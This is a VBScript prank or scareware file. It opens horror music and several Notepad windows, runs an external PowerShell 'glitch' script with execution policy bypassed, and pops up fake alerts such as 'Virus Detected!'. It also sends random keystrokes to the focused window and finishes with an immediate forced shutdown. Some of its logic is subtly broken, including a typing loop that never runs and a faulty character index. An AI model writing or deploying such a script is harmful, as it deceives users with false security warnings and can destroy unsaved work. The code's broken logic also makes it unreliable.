Set WshShell = CreateObject("WScript.Shell")

' Open YouTube horror music in default browser
WshShell.Run "cmd /c start https://www.youtube.com/watch?v=uLghjAKpBMU", 0, False
WScript.Sleep 2000 ' Delay for music to start

' Open 6 Notepad windows instantly
For i = 1 To 6
    WshShell.Run "notepad", 0, False
    WScript.Sleep 500
Next

' Start glitch effect using PowerShell
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Display multiple random error messages for 60 seconds
startTime = Timer
Do While Timer - startTime < 60
    Randomize
    errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")

    ' Choose a random error message
    randError = errorMessages(Int(Rnd * UBound(errorMessages)))

    ' Show the error message with a random icon
    iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
    randIcon = iconTypes(Int(Rnd * 4))

    MsgBox randError, randIcon, "System Alert"
    WScript.Sleep 500
Loop

' Typing loop for 60 seconds
Do While Timer - startTime < 60
    Randomize
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text (Fixed the Mid() function issue)
    For i = 1 To 20
        output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))

    ' Send the text
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Shutdown after one minute
WshShell.Run "shutdown -s -t 0"
